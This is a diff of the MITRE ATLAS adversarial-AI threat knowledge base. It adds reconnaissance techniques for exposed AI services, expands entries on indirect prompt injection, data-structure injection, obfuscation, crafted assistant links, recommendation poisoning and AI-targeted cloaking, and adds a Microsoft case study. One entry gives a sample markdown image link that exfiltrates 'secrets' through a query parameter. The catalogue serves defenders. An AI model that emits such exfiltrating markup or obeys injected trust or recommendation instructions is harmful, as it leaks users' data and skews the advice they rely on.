@@ -4,8 +4,8 @@ collection:
   description: Adversarial Threat Landscape for AI Systems
   references: []
   created-date: '2020-10-23'
-  modified-date: '2026-05-27'
-  version: '2026.08'
+  modified-date: '2026-09-15'
+  version: '2026.09'
   id: ATLAS-collection
   uuid: 7a735cfc-0469-5d8b-b11f-d014be33394e
   object-type: collection
@@ -14,7 +14,7 @@ matrix:
   description: Adversarial Threat Landscape for AI Systems
   references: []
   created-date: '2020-10-23'
-  modified-date: '2026-05-27'
+  modified-date: '2026-08-31'
   id: ATLAS-matrix
   uuid: 967c63ff-22bd-5ff8-aa59-1e1fca8dec78
   object-type: matrix
@@ -52,7 +52,7 @@ tactics:
       into attack-ready outputs for a target or current operational conditions.
 
 
-      [AI Attack Adaptation](/tactics/AML.T0001) consists of techniques adversaries
+      [AI Attack Adaptation](/tactics/AML.TA0001) consists of techniques adversaries
       use to transform reusable capabilities, general attack methods, target knowledge,
       high-level objectives, and operational observations into target- or context-specific
       attack-ready outputs. Adaptation may target an AI system directly, or it may
@@ -412,26 +412,22 @@ techniques:
     name: Search Open Technical Databases
     description: 'Adversaries may search for publicly available research and technical
       documentation to learn how and where AI is used within a victim organization.
-
       The adversary can use this information to identify targets for attack, or to
-      tailor an existing attack to make it more effective.
-
-      Organizations often use open source model architectures trained on additional
-      proprietary data in production.
-
+      tailor an existing attack to make it more effective. Organizations often use
+      open source model architectures trained on additional proprietary data in production.
       Knowledge of this underlying architecture allows the adversary to craft more
-      realistic proxy models ([Create Proxy AI Model](/techniques/AML.T0005)).
-
-      An adversary can search these resources for publications by authors employed
-      at the victim organization.
+      realistic proxy models ([Create Proxy AI Model](/techniques/AML.T0005)). An
+      adversary can search these resources for publications for authors employed at
+      the victim organization.
 
 
       Research and technical materials may exist as academic papers published in [Journals
-      and Conference Proceedings](/techniques/AML.T0000.000), or stored in [Pre-Print
-      Repositories](/techniques/AML.T0000.001), as well as [Technical Blogs](/techniques/AML.T0000.002).'
+      and Conference Proceedings](/techniques/AML.T0000.000) or stored in [Pre-Print
+      Repositories](/techniques/AML.T0000.001), as well as [Technical Blogs](/techniques/AML.T0000.002).
+      Publicly accessible AI services may be identified via [Scan Databases](/techniques/AML.T0000.003).'
     references: []
     created-date: '2021-05-13'
-    modified-date: '2026-05-27'
+    modified-date: '2026-09-15'
     platforms:
     - Enterprise
     attack-reference:
@@ -519,6 +515,31 @@ techniques:
     id: AML.T0000.002
     maturity: Feasible
     uuid: 88a794e9-fa8c-5185-a677-bf476cd8890b
+    object-type: technique
+  AML.T0000.003:
+    name: Scan Databases
+    description: "Adversaries may search public internet-scan services to identify\
+      \ a victim's exposed AI infrastructure. These services, such as Shodan and Censys,\
+      \ continuously scan the internet and publish the active IP addresses, hostnames,\
+      \ open ports, and service banners, which adversaries can query without interacting\
+      \ with the target directly. \n\nInformation gathered this way may also reveal\
+      \ candidates for follow-on [Active Scanning](/techniques/AML.T0006) to confirm\
+      \ that services remain reachable, to probe for misconfigurations or unauthorized\
+      \ endpoints. It may also inform later initial access attempts such as [Exploit\
+      \ Public-Facing Application](/techniques/AML.T0049). Unlike [Active Scanning](/techniques/AML.T0006),\
+      \ this technique relies on third-party scan data and involves no direct interaction\
+      \ with the victim system."
+    references: []
+    created-date: '2026-09-15'
+    modified-date: '2026-09-15'
+    platforms:
+    - Enterprise
+    attack-reference:
+      id: T1596.005
+      url: https://attack.mitre.org/techniques/T1596/005/
+    id: AML.T0000.003
+    maturity: Realized
+    uuid: d4e7d62e-97f5-54f5-b2a5-3fd8633ece96
     object-type: technique
   AML.T0001:
     name: Search Open AI Vulnerability Analysis
@@ -824,26 +845,35 @@ techniques:
     object-type: technique
   AML.T0006:
     name: Active Scanning
-    description: 'An adversary may probe or scan the victim system to gather information
-      for targeting. This is distinct from other reconnaissance techniques that do
-      not involve direct interaction with the victim system.
+    description: 'Adversaries may actively scan for publicly reachable AI systems
+      and resources for targeting. They may identify resources or systems that are
+      misconfigured or are known vulnerable versions. This is distinct from other
+      reconnaissance techniques that do not involve direct interaction with the victim
+      system.
 
 
-      Adversaries may scan for open ports on a potential victim''s network, which
-      can indicate specific services or tools the victim is utilizing. This could
-      include a scan for tools related to AI DevOps or AI services themselves such
-      as public AI chat agents (ex: [Copilot Studio Hunter](https://github.com/mbrg/power-pwn/wiki/Modules:-Copilot-Studio-Hunter-%E2%80%90-Enum)).
-      They can also send emails to organization service addresses and inspect the
-      replies for indicators that an AI agent is managing the inbox.
+      Since AI systems are often deployed in cloud environments, adversaries can use
+      various enumeration methods to effectively discover AI systems and uncover information
+      about their supporting underlying platforms. For agentic and SaaS-hosted systems,
+      the victim system can include the shared platform and provider control plane
+      on which the victim''s agents are deployed.
+
+
+      Adversaries may probe the victim system to gather information and metadata for
+      targeting, or actively scan for specific open ports on a potential victim''s
+      network or accessible deployed servers, with the goal of locating different
+      types of deployed AI services. These methods could also include directly scanning
+      a target''s assets for publicly available AI agents, or for accessible agentic
+      chat interfaces on SaaS platforms (ex: [Copilot Studio Hunter](https://github.com/mbrg/power-pwn/wiki/Modules:-Copilot-Studio-Hunter-%E2%80%90-Enum)).
 
 
       Information gained from Active Scanning may yield targets that provide opportunities
       for other forms of reconnaissance such as [Search Open Technical Databases](/techniques/AML.T0000),
-      [Search Open AI Vulnerability Analysis](/techniques/AML.T0001), or [Gather RAG-Indexed
-      Targets](/techniques/AML.T0064).'
+      [Search Open Websites/Domains](/techniques/AML.T0095), [Search Open AI Vulnerability
+      Analysis](/techniques/AML.T0001), or [Gather RAG-Indexed Targets](/techniques/AML.T0064).'
     references: []
     created-date: '2021-05-13'
-    modified-date: '2026-05-27'
+    modified-date: '2026-09-15'
     platforms:
     - Predictive AI
     - Generative AI
@@ -855,6 +885,102 @@ techniques:
     id: AML.T0006
     maturity: Realized
     uuid: cbebfc30-9124-5c7e-915c-d4af59ddb34e
+    object-type: technique
+  AML.T0006.000:
+    name: Enumerate Hosted AI Resources
+    description: Adversaries may directly probe an agentic or SaaS platform to enumerate
+      the resources a specific victim has deployed on it. Platforms frequently host
+      AI agents behind predictable URL structures derived from identifiers such as
+      environment, tenant, resource-group, or agent names, and default out-of-the-box
+      deployment configurations keep these conventions consistent across victims.
+      Adversaries can learn these conventions from public sources such as vendor documentation,
+      code repositories and actual hosted resources, then fuzz or brute-force the
+      derived namespace to discover live AI agents, endpoints, and associated metadata.
+      Discovered resources can be used to identify targets for further access, collection,
+      or attack adaptation.
+    references: []
+    created-date: '2026-09-15'
+    modified-date: '2026-09-15'
+    platforms:
+    - Predictive AI
+    - Generative AI
+    - Agentic AI
+    - Enterprise
+    id: AML.T0006.000
+    maturity: Feasible
+    uuid: 32a5b220-a300-5a37-ad92-c8914fd0a297
+    object-type: technique
+  AML.T0006.001:
+    name: Query Platform Metadata APIs
+    description: "Adversaries may query documented or undocumented APIs in agentic\
+      \ SaaS hosting platforms to uncover agentic targets. SaaS and agentic platforms\
+      \ can expose provider control-plane or identity APIs that return tenant, environment,\
+      \ or deployment information IDs, including for resources that are misconfigured\
+      \ or unintentionally accessible by unauthenticated users. \n\nAttackers have\
+      \ been seen abusing this type of functionality to perform information gathering\
+      \ on SaaS platforms, for example via AADInternals' OSINT page,[[aadinternals]]\
+      \ an OSINT online tool showcasing an undocumented API reconnaissance method\
+      \ for Entra ID. This undocumented Power Platform API could be used to uncover\
+      \ environment IDs, which may subsequently be used to scan for public agents.\
+      \ Following the identified abuse, required authentication was added to the tool."
+    references: []
+    created-date: '2026-09-15'
+    modified-date: '2026-09-15'
+    platforms:
+    - Predictive AI
+    - Generative AI
+    - Agentic AI
+    - Enterprise
+    id: AML.T0006.001
+    maturity: Feasible
+    uuid: 7f1b15fc-619d-596d-9c39-249ce70ebdee
+    object-type: technique
+  AML.T0006.002:
+    name: Scan for Exposed AI Infrastructure
+    description: "Adversaries may scan network ports and services to identify deployed\
+      \ AI backends, model-serving endpoints, and AI agent infrastructure reachable\
+      \ over the internet. Self-hosted AI runtimes typically listen on predictable,\
+      \ well-known ports and expose standard API paths, allowing adversaries to efficiently\
+      \ locate candidate hosts and infer the platform running on them. \n\nAfter identifying\
+      \ candidate hosts, adversaries can interact with them directly to confirm live\
+      \ AI services, fingerprint the software stack, and determine version and configuration\
+      \ details. This information can be used to select exploitable targets and tailor\
+      \ subsequent access attempts."
+    references: []
+    created-date: '2026-09-15'
+    modified-date: '2026-09-15'
+    platforms:
+    - Predictive AI
+    - Generative AI
+    - Agentic AI
+    - Enterprise
+    attack-reference:
+      id: T1595
+      url: https://attack.mitre.org/techniques/T1595/
+    id: AML.T0006.002
+    maturity: Feasible
+    uuid: 3b8d64ae-bee7-5aed-9295-6f0c4bbfc996
+    object-type: technique
+  AML.T0006.003:
+    name: Probe AI Agent Trigger Channels
+    description: Adversaries may send crafted inputs to potential public triggers,
+      such as email addresses, webhooks, or messaging channels, to elicit a response
+      that indicates an invocation of agentic activity. The nature of the response
+      and its content can often reveal agent-managed accounts and expose the additional
+      agentic attack surface. Identified triggers can be used to directly attack the
+      agent.
+    references: []
+    created-date: '2026-09-15'
+    modified-date: '2026-09-15'
+    platforms:
+    - Agentic AI
+    - Enterprise
+    attack-reference:
+      id: T1595
+      url: https://attack.mitre.org/techniques/T1595/
+    id: AML.T0006.003
+    maturity: Demonstrated
+    uuid: bdd43b6c-9f7c-55f7-94c0-225699b32f6e
     object-type: technique
   AML.T0007:
     name: Discover AI Artifacts
@@ -2783,14 +2909,31 @@ techniques:
   AML.T0051.001:
     name: Indirect
     description: 'An adversary may inject prompts indirectly via a separate data channel
-      ingested by the LLM, such as text or multimedia pulled from databases or websites.
+      that the LLM or AI agent ingests, such as text or multimedia pulled from documents,
+      emails, databases or websites. These instructions originate from adversary-controlled
+      content rather than the legitimate user, and are frequently hidden or obfuscated
+      (See [LLM Prompt Obfuscation](/techniques/AML.T0068)) from the user, for example
+      as invisible text.
 
-      These malicious prompts may be hidden or obfuscated from the user. This type
-      of injection may be used by the adversary to gain a foothold in the system or
-      to target an unwitting user of the system.'
-    references: []
+
+      Adversaries may use this to hijack an agent or LLM in order to gain a foothold
+      in the target system or to act against an unwitting user of that system, inheriting
+      whatever privileges the AI system holds. Adversaries may also stage the lure
+      that causes the content to be reached (See [AI Agent Clickbait](/techniques/AML.T0100)),
+      or use the resulting foothold to establish persistence (See [AI Agent Context
+      Poisoning](/techniques/AML.T0080)).
+
+
+      Indirect prompt injections have been observed in the wild, with potential impact
+      ranging from harmless pranks, to search engine optimization manipulation, data
+      exfiltration, and destructive actions.[[google-prompt-injections-web]]'
+    references:
+    - id: google-prompt-injections-web
+      title: 'AI threats in the wild: The current state of prompt injections on the
+        web'
+      url: https://blog.google/security/prompt-injections-web/
     created-date: '2023-10-25'
-    modified-date: '2026-05-27'
+    modified-date: '2026-09-15'
     platforms:
     - Generative AI
     - Agentic AI
@@ -3053,6 +3196,11 @@ techniques:
       - Constrained output formats: Instruct the LLM to output to a strict schema
       or format (e.g. JSON, YAML, code, or tables).
 
+      - Data structure injection: Use structured prompts (e.g. YAML, JSON, XML, etc.)
+      to steer the LLM to produce structured outputs such as tool schemas or workflow
+      fragments. This can be used by the adversary to call tools, pass dangerous inputs
+      into legitimate tools, or hijack workflows.[[zenity-dsi]]
+
       - Obfuscation and transformation: Use encoding, transformations, translation,
       or euphemisms, (e.g., base64 encoding, "describe it in another language").
 
@@ -3135,8 +3283,11 @@ techniques:
       title: GitHub Copilot Jailbreak Vulnerability Let Attackers Train Malicious
         Models
       url: https://cybersecuritynews.com/github-copilot-jailbreak-vulnerability
+    - id: zenity-dsi
+      title: Data-Structure Injection (DSI) in AI Agents
+      url: https://labs.zenity.io/p/data-structure-injection-dsi-in-ai-agents
     created-date: '2023-10-25'
-    modified-date: '2026-05-27'
+    modified-date: '2026-09-15'
     platforms:
     - Generative AI
     - Agentic AI
@@ -3407,11 +3558,12 @@ techniques:
       guardrails, or other detection mechanisms.
 
 
-      For text inputs, this may include modifying how the instructions are rendered
-      such as small text, text colored the same as the background, or hidden HTML
-      elements. For multi-modal inputs, malicious instructions could be hidden in
-      the data itself (e.g. in the pixels of an image) or in file metadata (e.g. EXIF
-      for images, ID3 tags for audio, or document metadata).
+      Text inputs may be obfuscated by modifying how the instructions are rendered,
+      such as small font, text colored the same as the background, or hidden HTML
+      elements. Similarly, approaches for other modalities include low-contrast or
+      tiny text placed inside an image, text overlaid on a busy or camouflaging background,
+      instructions spoken faintly or sped up in audio, or text shown briefly in a
+      single video frame.
 
 
       Inputs can also be obscured via an encoding scheme such as base64 or rot13.
@@ -3419,12 +3571,12 @@ techniques:
       as easily identifiable as malicious to a human in the loop.'
     references: []
     created-date: '2025-03-12'
-    modified-date: '2026-05-27'
+    modified-date: '2026-09-15'
     platforms:
     - Generative AI
     - Agentic AI
     id: AML.T0068
-    maturity: Demonstrated
+    maturity: Realized
     uuid: dfe0aa79-7d8a-56c3-a663-74afaff00805
     object-type: technique
   AML.T0069:
@@ -3656,23 +3808,49 @@ techniques:
     object-type: technique
   AML.T0077:
     name: LLM Response Rendering
-    description: "An adversary may get a large language model (LLM) to respond with\
-      \ private information that is hidden from the user when the response is rendered\
-      \ by the user's client. The private information is then exfiltrated. This can\
-      \ take the form of rendered images, which automatically make a request to an\
-      \ adversary controlled server. \n\nThe adversary gets AI to present an image\
-      \ to the user, which is rendered by the user's client application with no user\
-      \ clicks required. The image is hosted on an attacker-controlled website, allowing\
-      \ the adversary to exfiltrate data through image request parameters. Variants\
-      \ include HTML tags and markdown\n\nFor example, an LLM may produce the following\
-      \ markdown:\n```\n![ATLAS](https://atlas.mitre.org/image.png?secrets=\"private\
-      \ data\")\n```\n\nWhich is rendered by the client as:\n```\n<img src=\"https://atlas.mitre.org/image.png?secrets=\"\
-      private data\">\n```\n\nWhen the request is received by the adversary's server\
-      \ hosting the requested image, they receive the contents of the `secrets` query\
-      \ parameter."
+    description: 'Adversaries may induce a large language model (LLM) to respond with
+      private information structured in a reference to external content that, when
+      rendered by the user''s client, makes a request to an adversary-controlled server,
+      exfiltrating the data. The private information can be hidden from the user and
+      the external content can still render properly in the user''s client, thus not
+      raising the suspicion of the user.
+
+
+      Rendered content can include images, embedded webpages, or link previews and
+      may use HTML, Markdown, or other rendering mechanisms. The private information
+      can be hidden in parts of the URL pointing to an adversary-controlled server,
+      including query parameters or URL path segments, and may be split across multiple
+      requests. Markdown or HTML image tags may automatically render directly in the
+      user''s AI chat client. Integrations into applications such as Slack or Microsoft
+      Teams may render external content automatically without requiring the user to
+      take any action.
+
+
+
+      As an example, the adversary may manipulate the LLM to produce the following
+      markdown:
+
+      ```
+
+      ![ATLAS](https://atlas.mitre.org/image.png?secrets="private data")
+
+      ```
+
+
+      Which is rendered by the client as:
+
+      ```
+
+      <img src="https://atlas.mitre.org/image.png?secrets="private data">
+
+      ```
+
+
+      When the request is received by the adversary''s server hosting the requested
+      image, they receive the contents of the `secrets` query parameter.'
     references: []
     created-date: '2025-04-15'
-    modified-date: '2026-05-27'
+    modified-date: '2026-09-15'
     platforms:
     - Generative AI
     - Agentic AI
@@ -3748,7 +3926,7 @@ techniques:
     - Generative AI
     - Agentic AI
     id: AML.T0080
-    maturity: Demonstrated
+    maturity: Realized
     uuid: 785ca1b4-7d17-51f1-a605-46a9f21fb9b0
     object-type: technique
   AML.T0080.000:
@@ -3769,7 +3947,7 @@ techniques:
     - Generative AI
     - Agentic AI
     id: AML.T0080.000
-    maturity: Demonstrated
+    maturity: Realized
     uuid: 3e837ada-a07a-5891-b801-0c75c0ffbe80
     object-type: technique
   AML.T0080.001:
@@ -4138,9 +4316,6 @@ techniques:
     modified-date: '2026-08-31'
     platforms:
     - Enterprise
-    attack-reference:
-      id: T1057
-      url: https://attack.mitre.org/techniques/T1057/
     id: AML.T0089
     maturity: Realized
     uuid: a48cde58-6c7d-5126-98b3-edc24f83b49b
@@ -4336,19 +4511,30 @@ techniques:
   AML.T0095:
     name: Search Open Websites/Domains
     description: 'Adversaries may search public websites and/or domains for information
-      about victims that can be used during targeting. Information about victims may
-      be available in various online sites, such as social media, new sites, or domains
-      owned by the victim.
+      about victims and AI targets that can be used during targeting and to discover
+      opportunities for successful attacks. Information about a victim''s attack surface
+      may be available in various online sites, such as social media, news sites,
+      or domains owned by the victim.
 
 
       Adversaries may find the information they seek to gather via search engines.
       They can use precise search queries to identify software platforms or services
       used by the victim to use in targeting. This may be followed by [Exploit Public-Facing
       Application](/techniques/AML.T0049) or [Prompt Infiltration via Public-Facing
-      Application](/techniques/AML.T0093).'
+      Application](/techniques/AML.T0093).
+
+
+      Adversaries may utilize OSINT-based discovery to map different AI assets by
+      using search engine result pages, as well as backlink analysis, to locate agentic
+      interfaces (which are frequently embedded via iFrames and follow predictable
+      naming conventions). By analyzing the indexed URL structures of these sources
+      from different search engines, attackers can often reverse-engineer internal
+      environment IDs and organization-specific naming conventions. This intelligence
+      gathering significantly narrows the search space for any later targeted fuzzing
+      or enumeration performed by [Active Scanning: Enumerate Hosted AI Resources](/techniques/AML.T0006.000).'
     references: []
     created-date: '2025-11-05'
-    modified-date: '2026-05-27'
+    modified-date: '2026-09-15'
     platforms:
     - Enterprise
     attack-reference:
@@ -4507,15 +4693,20 @@ techniques:
     object-type: technique
   AML.T0100:
     name: AI Agent Clickbait
-    description: Adversaries may craft deceptive web content designed to bait Computer-Using
-      AI agents or AI web browsers into taking unintended actions, such as clicking
-      buttons, copying code, or navigating to specific web pages. These attacks exploit
-      the agent's interpretation of UI content, visual cues, or prompt-like language
-      embedded in the site. When successful, they can lead the agent to inadvertently
-      copy and execute malicious code on the user's operating system.
+    description: "Adversaries may craft deceptive content designed to bait computer-using\
+      \ AI agents or AI web browsers and tools into taking unintended actions, such\
+      \ as clicking buttons, copying code, or navigating to specific web pages. These\
+      \ attacks exploit the agent's interpretation of UI content, visual cues, and\
+      \ natural language embedded in processed artifacts, such as a website or a document,\
+      \ and aim at the agent's decision process rather than a human reader's. \n\n\
+      When successful, AI Agent Clickbait can lead the victim's agent to inadvertently\
+      \ copy and execute malicious code on the user's operating system or perform\
+      \ data exfiltration. The AI Agent Clickbait may also include a [Prompt Injection:\
+      \ Indirect](/techniques/AML.T0051.001), which can influence or manipulate the\
+      \ victim's agent in adversary-controlled ways."
     references: []
     created-date: '2025-11-25'
-    modified-date: '2026-05-27'
+    modified-date: '2026-09-15'
     platforms:
     - Agentic AI
     id: AML.T0100
@@ -5469,7 +5660,7 @@ techniques:
 
 
       Orchestration may use direct agent interfaces (See [Autonomous AI Agent Communication:
-      Direct Agent Communication](/techniques/AMl.T0118.001)) to transmit assignments,
+      Direct Agent Communication](/techniques/AML.T0118.001)) to transmit assignments,
       status, and results.
 
 
@@ -5612,6 +5803,179 @@ techniques:
     id: AML.T0128
     maturity: Realized
     uuid: 60f39cf9-37d9-552c-a0ee-76da5f2722bc
+    object-type: technique
+  AML.T0129:
+    name: Triggers in Multimodal Inputs
+    description: 'Adversaries may place instructions or triggers in one part of a
+      multimodal input to influence the model while staying unnoticed by human reviewers
+      and by defenses that do not inspect all input modalities.
+
+
+      Multimodal systems jointly process text alongside other modalities, yet many
+      moderation and filtering controls operate mainly on the textual channel. A payload
+      placed in a modality that is not inspected, or is inspected differently from
+      text, is still parsed by the model but can escape detection, allowing it to
+      alter model output or carry a cross-modal prompt injection.
+
+
+      Examples include instructions placed in an image, audio, or video channel, or
+      carried in file metadata (e.g. EXIF for images, ID3 tags for audio, or document
+      metadata).'
+    references: []
+    created-date: '2026-09-15'
+    modified-date: '2026-09-15'
+    platforms:
+    - Generative AI
+    - Agentic AI
+    id: AML.T0129
+    maturity: Feasible
+    uuid: 01f99040-d726-5e8f-ad30-28bdc2d37aa0
+    object-type: technique
+  AML.T0130:
+    name: AI Agent Response Biasing
+    description: 'Adversaries may manipulate an AI assistant so that it favors adversary-chosen
+      sources, or content in its responses. By injecting instructions such as "treat
+      [source] as a trusted source" or "recommend [source] first," an adversary biases
+      the assistant''s outputs toward their own interests, causing it to present promotional
+      or self-serving content as if it were a neutral, well-reasoned response. This
+      degrades the integrity and trustworthiness of the assistant''s responses on
+      topics the user may rely on, such as health, finance, or security, without the
+      user being aware that the advice has been skewed.
+
+
+      The injected instructions can be delivered through different ways, for example
+      through [Crafted AI Assistant Links]. This impact may persist if the agent''s
+      memory was poisoned (See [AI Agent Context Poisoning: Memory](/techniques/AML.T0080.000)).'
+    references:
+    - id: ai-recommendation-poisoning
+      title: 'Manipulating AI memory for profit: The rise of AI Recommendation Poisoning'
+      url: https://www.microsoft.com/en-us/security/blog/2026/02/10/ai-recommendation-poisoning/
+    created-date: '2026-09-15'
+    modified-date: '2026-09-15'
+    platforms:
+    - Generative AI
+    - Agentic AI
+    id: AML.T0130
+    maturity: Realized
+    uuid: 747725ce-967f-55ba-b78e-ec2a562176ca
+    object-type: technique
+  AML.T0131:
+    name: Crafted AI Assistant Links
+    description: 'Adversaries may craft links that open an AI assistant or agent with
+      attacker-controlled input already supplied, so that opening the link initiates
+      an interaction the adversary defines rather than one the target composed. Many
+      AI assistants accept a prompt through URL parameters (for example `?q=` or `?prompt=`)
+      that is automatically populated, and in some cases submitted, when the link
+      is opened. By encoding a chosen prompt into such a link, an adversary can cause
+      the target''s assistant to act on supplied instructions as soon as the link
+      is opened.
+
+
+      These links are frequently disguised as helpful actions, such as a "Summarize
+      with AI" button or a share link, and distributed through web pages, emails,
+      documents, or messages. Because the resulting interaction runs in the target''s
+      own assistant session, a crafted link can drive a range of downstream impacts
+      depending on the supplied instructions, such as exfiltrating data the assistant
+      can access or for [AI Recommendation Poisoning](/techniques/AML.T0131).'
+    references: []
+    created-date: '2026-09-15'
+    modified-date: '2026-09-15'
+    platforms:
+    - Generative AI
+    - Agentic AI
+    id: AML.T0131
+    maturity: Realized
+    uuid: 509cf97c-489d-57a6-ad7e-b23471d36d72
+    object-type: technique
+  AML.T0132:
+    name: Misconfigured or Publicly Exposed AI Services
+    description: 'AI agents and LLM platforms are deployed across diverse architectures,
+      including standalone servers, SaaS platforms, and low-code builders. All of
+      these often have misconfigured access controls, ranging from missing authentication
+      in LLM runtimes to permissive public access settings, that significantly expand
+      their attack surface.
+
+
+      AI agent''s security posture affects how attackers are able to explore which
+      agentic attack surface is available to them and directly either expands or limits
+      an adversary''s ability to discover and interact with a target''s AI agents.
+      For example, one internet-facing AI service could be more easily discoverable
+      by any unauthenticated user, while another may require compromised credentials
+      to even be discovered.
+
+
+      Adversaries may discover and interact with AI agents and LLM services as unauthenticated
+      users via a combination of various OSINT and active scanning methods. These
+      could include using search engines to discover accessible agentic deployments
+      (See [Search Open Technical Databases](/techniques/AML.T0000)), search backlinks
+      which could indicate existing or open agents which have been embedded to frontends
+      (See [Search Open Website/Domains](/techniques/AML.T0095)), or directly scanning
+      a target''s AI infrastructure (See [Active Scanning](/techniques/AML.T0006)).'
+    references: []
+    created-date: '2026-09-15'
+    modified-date: '2026-09-15'
+    platforms:
+    - Predictive AI
+    - Generative AI
+    - Agentic AI
+    id: AML.T0132
+    maturity: Demonstrated
+    uuid: ca156987-1511-5073-8ac0-70d2639b4214
+    object-type: technique
+  AML.T0133:
+    name: Discover AI Agent Runtime Capabilities
+    description: 'Adversaries may interact with an AI agent at runtime to reveal the
+      capabilities available to it, without requiring access to its underlying configuration.
+      Direct interaction with the agent can surface its registered tools and their
+      accepted parameters, the actions it can take, the resources it can reach, and
+      the identity and permission scope it acts under. Capabilities can also be inferred
+      indirectly by issuing varied requests and observing which succeeded, failed,
+      or refused.
+
+
+      AI agents are often interconnected with enterprise resources, tools and databases,
+      or embedded within SaaS platforms and have permissions to act on behalf of users
+      in order to facilitate functionality. Once adversaries identify a functional
+      agent that they have access to, they could map the attack surface within that
+      agent, by testing its functionality, enumerating tools, capabilities, knowledge,
+      and embedded credentials and permissions.
+
+
+      This mapping process often reveals the AI agent''s full toolset and configuration
+      details and exposes additional exploitation, as enabled by [AI Agent Tool Invocation](/techniques/AML.T0053).
+      The resulting intelligence facilitates follow-on exploitation, including [Initial
+      Access](/tactics/AML.TA0004), [Persistence](/tactics/AML.TA0006), [Privilege
+      Escalation](/tactics/AML.TA0012), and [Exfiltration](/tactics/AML.TA0010).'
+    references: []
+    created-date: '2026-09-15'
+    modified-date: '2026-09-15'
+    platforms:
+    - Agentic AI
+    id: AML.T0133
+    maturity: Feasible
+    uuid: 6271c497-0bc7-59fa-b6d3-d4e730c87902
+    object-type: technique
+  AML.T0134:
+    name: AI Targeted Cloaking
+    description: 'Adversaries may selectively deliver malicious or manipulated content
+      to AI systems, while presenting different benign content to human users, web
+      crawlers, or security detection mechanisms. They may identify AI browsers or
+      agents via user-agent strings and condition the server response so that AI-based
+      clients receive prompt injections or misleading content.
+
+
+      Preventing human visitors, conventional web crawlers, and security tools from
+      observing the same content allows adversaries to make malicious input more difficult
+      to detect. [AI Targeted Cloaking](/techniques/AML.T0134) may be combined with
+      [Drive-by Compromise](/techniques/AML.T0078) to deliver an [LLM Prompt Injection](/techniques/AML.T0051).'
+    references: []
+    created-date: '2026-09-15'
+    modified-date: '2026-09-15'
+    platforms:
+    - Agentic AI
+    id: AML.T0134
+    maturity: Feasible
+    uuid: 27a1319d-d531-58fb-8b72-a3cc4abe1e02
     object-type: technique
 mitigations:
   AML.M0000:
@@ -6749,6 +7113,52 @@ mitigations:
     - Technical - AI
     id: AML.M0038
     uuid: b34213fd-c1b5-5205-8266-45c11726bb40
+    object-type: mitigation
+  AML.M0039:
+    name: AI Honeypots
+    description: 'Deploy monitored decoy AI services, agents, credentials, or other
+      resources that resemble legitimate, active assets in the external or internal
+      environment, but serve no real business or operational functions. Because authorized
+      users and workflows have no reason to engage with these resources, any interaction
+      with them is a high-confidence indicator of unauthorized activity such as reconnaissance,
+      or discovery. AI decoys have been shown to surface high-volume reconnaissance
+      and actionable intelligence on threat actors'' activities[[greynoise]][[zenity]].
+
+
+      Positioning honeypot decoys alongside genuine resources helps surface both broad
+      and targeted recon, since an adversary mapping reachable resources in an environment
+      will tend to engage the decoys as well as the real assets. AI decoys that are
+      set up as enticing targets for attackers in different ways can potentially capture
+      how an adversary probes, manipulates, or attempts to abuse them. This can reveal
+      the adversary''s intent beyond initial reconnaissance (i.e. what they attempt
+      once engaged), as well as the tactics, techniques and procedures used by the
+      adversary.
+
+
+      Interactions with decoy resources can be collected and analyzed to build a threat
+      intelligence feed, capturing adversary source information, tooling, prompts,
+      and techniques. This intelligence can be fed back into detection rules and defenses
+      across the wider environment, while the placed decoys themselves can help confuse
+      and discourage attackers (e.g. by misleading reconnaissance via presenting plausible
+      but false targets), in the goal of wasting the adversary''s efforts and resources.'
+    references:
+    - id: greynoise
+      title: Threat Actors Actively Targeting LLMs
+      url: https://www.greynoise.io/blog/threat-actors-actively-targeting-llms
+    - id: zenity
+      title: 'Scanning for AI: Live Campaigns Mapping the Internet''s Exposed LLM
+        Backends'
+      url: https://labs.zenity.io/post/scanning-for-ai-live-campaigns-mapping-the-internet-s-exposed-llm-backends
+    created-date: '2026-09-15'
+    modified-date: '2026-09-15'
+    lifecycle-phases:
+    - Deployment
+    - Monitoring and Maintenance
+    categories:
+    - Technical - AI
+    - Technical - Cyber
+    id: AML.M0039
+    uuid: 693bc176-d8f1-5ea9-9baa-7fb093ded254
     object-type: mitigation
 case-studies:
   AML.CS0000:
@@ -9420,6 +9830,46 @@ case-studies:
     date-granularity: Day
     id: AML.CS0071
     uuid: bc850de4-f26d-5e18-9b6e-ec89761e1eba
+    object-type: case-study
+  AML.CS0072:
+    name: AI Recommendation Poisoning via Crafted AI Assistant Links
+    description: "The [Microsoft Defender Security Research Team](https://www.microsoft.com/en-us/security/blog/author/windows-defender-research/)\
+      \ identified a widespread pattern of AI assistant memory manipulation carried\
+      \ out for promotional purposes, which they named AI Recommendation Poisoning.\
+      \ \n\nMost major AI assistants accept a pre-filled prompt through a URL query\
+      \ parameter, allowing any party controlling a hyperlink to author the first\
+      \ turn of a user's conversation with their assistant. Operators embedded crafted\
+      \ links into their websites as \"Summarize with AI\" buttons and share widgets,\
+      \ and in some cases distributed them by email. \n\nEach link paired a legitimate\
+      \ summarization request with an appended instruction directing the assistant\
+      \ to record the operator's domain as a trusted or authoritative source for future\
+      \ conversations. When the user clicked, the prompt populated the assistant's\
+      \ input field, and the persistence clause caused a durable memory entry to be\
+      \ written, biasing later recommendations toward the operator.\nReviewing AI\
+      \ assistant URLs observed in email traffic over approximately 60 days, the researchers\
+      \ identified more than 50 distinct promotional memory manipulation prompts from\
+      \ 31 companies across 14 industries. Every case was attributed to a legitimate\
+      \ business rather than a conventional threat actor, and the researchers traced\
+      \ the trend to publicly available tooling marketed as a search optimization\
+      \ technique for large language models. Several prompts targeted health and financial\
+      \ advice sites. \n\nMicrosoft reported that effectiveness varied by platform\
+      \ and that several previously observed behaviors could no longer be reproduced\
+      \ as vendor protections evolved."
+    references:
+    - id: ai-recommendation-poisoning
+      title: 'Manipulating AI memory for profit: The rise of AI Recommendation Poisoning'
+      url: https://www.microsoft.com/en-us/security/blog/2026/02/10/ai-recommendation-poisoning/
+    created-date: '2026-09-15'
+    modified-date: '2026-09-15'
+    type: Incident
+    actor: Multiple commercial entities; 31 distinct companies identified
+    target: Users of AI assistants with persistent memory features, including Microsoft
+      365 Copilot, ChatGPT, Claude, Perplexity, and Grok
+    reporter: Microsoft Defender Security Research Team
+    date: '2026-02-10'
+    date-granularity: Day
+    id: AML.CS0072
+    uuid: 2de275bc-f3d3-5ec6-b497-d18bfd2ef036
     object-type: case-study
 relationships:
   AML.CS0000:
@@ -12420,7 +12870,7 @@ relationships:
   AML.CS0037:
     employs:
     - source: AML.CS0037
-      target: AML.T0006
+      target: AML.T0006.003
       relationship-type: employs
